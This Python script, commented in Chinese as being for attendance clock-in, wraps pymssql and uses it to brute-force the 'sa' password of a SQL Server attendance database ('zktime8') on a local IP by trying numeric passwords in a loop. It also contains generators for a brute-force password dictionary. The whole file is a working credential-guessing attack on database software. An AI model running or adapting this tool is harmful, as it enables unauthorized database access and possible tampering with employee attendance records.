import pymssql
import os
import itertools
import string


# 上班考勤打卡
class MSSQL:
    """
    对pymssql的简单封装

    """

    def __init__(self, host, user, pwd, db):
        self.host = host
        self.user = user
        self.pwd = pwd
        self.db = db

    def __GetConnect(self):
        """
        得到连接信息
        返回: conn.cursor()
        """
        if not self.db:
            raise (NameError, "没有设置数据库信息")
        self.conn = pymssql.connect(host=self.host, user=self.user, password=self.pwd, database=self.db, charset="utf8")
        cur = self.conn.cursor()
        if not cur:
            raise (NameError, "连接数据库失败")
        else:
            return cur

    def ExecQuery(self, sql):
        """
        执行查询语句
        返回的是一个包含tuple的list，list的元素是记录行，tuple的元素是每行记录的字段

        调用示例：
                ms = MSSQL(host="localhost",user="sa",pwd="123456",db="PythonWeiboStatistics")
                resList = ms.ExecQuery("SELECT id,NickName FROM WeiBoUser")
                for (id,NickName) in resList:
                    print str(id),NickName
        """
        cur = self.__GetConnect()
        cur.execute(sql)
        resList = cur.fetchall()

        # 查询完毕后必须关闭连接
        self.conn.close()
        return resList

    def ExecNonQuery(self, sql):
        """
        执行非查询语句

        调用示例：
            cur = self.__GetConnect()
            cur.execute(sql)
            self.conn.commit()
            self.conn.close()
        """
        cur = self.__GetConnect()
        cur.execute(sql)
        self.conn.commit()
        self.conn.close()


def crackdict(max, min=1, chars=None):
    assert max >= min >= 1

    if chars is None:
        # import string
        chars = string.printable[:-5]

    p = []
    for i in range(min, max + 1):
        p.append(itertools.product(string.printable[:-5], repeat=i))

    return itertools.chain(*p)


def pd():
    # 生成密码字典文件
    pds = []
    rg = range(0, 10)
    for p1 in rg:
        for p2 in rg:
            for p3 in rg:
                for p4 in rg:
                    for p5 in rg:
                        for p6 in rg:
                            for p7 in rg:
                                for p8 in rg:
                                    for p9 in rg:
                                        for p10 in rg:
                                            num = "%s%s%s%s%s%s%s%s%s%s" % (p1, p2, p3, p4, p5, p6, p7, p8, p9, p10)
                                            pds.append(num)

    file_object = open('f:/pwdNum6.txt', 'w')
    file_object.writelines(['%s%s' % (x, os.linesep) for x in pds])
    file_object.close()


def main():
    for i in range(88888, 9999999999):
        password = str(i)
        try:
            ms = MSSQL(host="192.168.2.228", user="sa", pwd=password, db="zktime8")
            query = ms.ExecQuery("SELECT GETDATE() AS CurrentDateTime")
            print('Success!', password, ';', query)
            input('Wait........')
        except Exception as e:
            # print(Exception, ":", e, password)
            print('error:', password)


if __name__ == '__main__':
    main()
